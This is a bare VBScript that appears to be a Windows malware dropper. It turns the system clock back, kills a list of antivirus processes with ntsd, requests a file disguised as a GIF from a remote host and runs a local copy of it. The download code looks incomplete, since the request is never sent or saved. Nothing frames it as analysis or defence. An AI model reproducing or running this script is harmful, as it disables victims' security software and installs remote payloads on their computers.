on error resume next
Set ws = CreateObject("Wscript.Shell")
ws.run "cmd /c set date=%date% &&date 1985-1-1 &&ping -n 10 127.0.0.1&&date %date%",vbhide
for each ps in getobject("winmgmts:\\.\root\cimv2:win32_process").instances_ 
if ps.Name="avp.exe"_
or ps.Name="avp.exe"_
or ps.Name="RavTask.exe"_
or ps.Name="RavMon.exe"_
or ps.Name="RavMonD.exe"_
or ps.Name="KVSrvXP.exe"_
or ps.Name="KVMonXP.kxp"_
or ps.Name="KAVStart.EXE"then
ws.run "ntsd -c q -p "+cstr(+ps.handle) +"",0
end if:next
iLocal = LCase("C:\hao.gif"):iRemote = LCase("http://www.hackhao.cn/logo/1.gif")
wscript.sleep 15000
Set xPost = CreateObject("Microsoft.XMLHTTP")
xPost.Open "GET",iRemote,0
ws.run iLocal
